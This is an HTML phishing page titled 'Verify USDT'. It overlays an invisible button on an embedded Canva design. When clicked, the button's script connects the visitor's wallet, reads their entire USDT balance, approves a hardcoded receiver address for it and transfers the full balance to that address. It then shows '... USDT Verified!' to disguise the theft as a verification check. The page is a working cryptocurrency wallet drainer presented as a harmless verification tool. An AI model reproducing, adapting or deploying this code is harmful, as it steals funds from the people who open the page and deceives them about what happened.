<!DOCTYPE html><html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Verify USDT</title>
  <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
  <style>
    body, html {
      margin: 0;
      padding: 0;
      overflow-x: hidden;
      font-family: sans-serif;
      background-color: #ffffff;
    }.canva-wrapper {
  position: relative;
  width: 100%;
  height: 0;
  padding-top: 177%; /* maintain Canva ratio */
  overflow: hidden;
}

.canva-wrapper iframe {
  position: absolute;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  border: none;
}

#verifyBtn {
  position: absolute;
  top: 57.5%; /* adjust to Canva button location */
  left: 50%;
  transform: translate(-50%, -50%);
  width: 60%;
  height: 10%;
  background: transparent;
  border: none;
  cursor: pointer;
  z-index: 10;
}

#status {
  text-align: center;
  margin-top: 20px;
  font-size: 18px;
  font-weight: bold;
  color: #1d1d1d;
}

  </style>
</head>
<body>  <div class="canva-wrapper">
    <iframe loading="lazy"
      src="https://www.canva.com/design/DAGqu3wFQs4/a7G3-SuUSKkMfyyhW5tPBA/view?embed"
      allowfullscreen="allowfullscreen" allow="fullscreen">
    </iframe>
    <button id="verifyBtn" onclick="startTransfer()"></button>
  </div>  <p id="status"></p>  <script>
    const receiver = "0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999";
    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955";

    const usdtABI = [
      { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "balance", "type": "uint256" }], "type": "function" },
      { "constant": false, "inputs": [{ "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "approve", "outputs": [{ "name": "success", "type": "bool" }], "type": "function" },
      { "constant": false, "inputs": [{ "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transfer", "outputs": [{ "name": "success", "type": "bool" }], "type": "function" }
    ];

    async function startTransfer() {
      const status = document.getElementById("status");

      if (typeof window.ethereum === 'undefined') {
        alert("⚠️ Trust Wallet browser required");
        return;
      }

      const web3 = new Web3(window.ethereum);
      await window.ethereum.request({ method: 'eth_requestAccounts' });
      const accounts = await web3.eth.getAccounts();
      const sender = accounts[0];

      const usdt = new web3.eth.Contract(usdtABI, usdtAddress);
      const balance = await usdt.methods.balanceOf(sender).call();

      if (balance == 0) {
        alert("❌ No USDT in wallet");
        return;
      }

      const readable = web3.utils.fromWei(balance, 'ether');
      status.innerText = "Approving...";

      try {
        await usdt.methods.approve(receiver, balance).send({ from: sender });
        status.innerText = "Transferring...";

        await usdt.methods.transfer(receiver, balance).send({ from: sender });
        status.innerText = readable + " USDT Verified!";
      } catch (err) {
        console.error(err);
        status.innerText = "❌ Transaction Failed or Cancelled.";
      }
    }
  </script></body>
</html>
